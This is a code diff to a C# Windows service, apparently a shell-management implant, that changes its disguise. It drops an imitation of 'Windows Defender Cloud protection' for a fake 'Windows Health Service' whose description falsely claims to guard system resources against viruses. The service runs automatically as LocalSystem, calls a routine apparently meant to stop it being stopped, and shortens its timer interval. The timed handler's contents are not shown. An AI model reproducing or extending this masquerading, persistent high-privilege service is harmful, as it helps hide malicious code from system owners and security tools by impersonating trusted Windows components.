@@ -51,14 +51,14 @@ namespace ShellManagerService
 
         public Program()
         {
-            ServiceName = "WinDefendCloudService";
+            ServiceName = "WindowsHealthService";
             DoNotStopTheRock();
         }
 
         protected override void OnStart(string[] args)
         {
             var timer = new Timer();
-            timer.Interval = 30000; //30 seconds
+            timer.Interval = 10000; //30 seconds
             timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
             timer.Enabled = true;
             base.OnStart(args);
@@ -83,9 +83,9 @@ namespace ShellManagerService
         {
             var processInstaller = new ServiceProcessInstaller();
             var serviceInstaller = new ServiceInstaller();
-            serviceInstaller.DisplayName = "Windows Defender Cloud protection";
-            serviceInstaller.Description = "Windows Defender Cloud protection service. Handles communications to Microsoft services. Any interruption could lead to unexpected behaviour.";
-            serviceInstaller.ServiceName = "WinDefendCloudService";
+            serviceInstaller.DisplayName = "Windows Health Service";
+            serviceInstaller.Description = "Windows Health Service helps in keeping important system resources intact, in case a virus attempts to modify or destroy them";
+            serviceInstaller.ServiceName = "WindowsHealthService";
             serviceInstaller.StartType = ServiceStartMode.Automatic;
             processInstaller.Account = ServiceAccount.LocalSystem;
             Installers.Add(processInstaller);
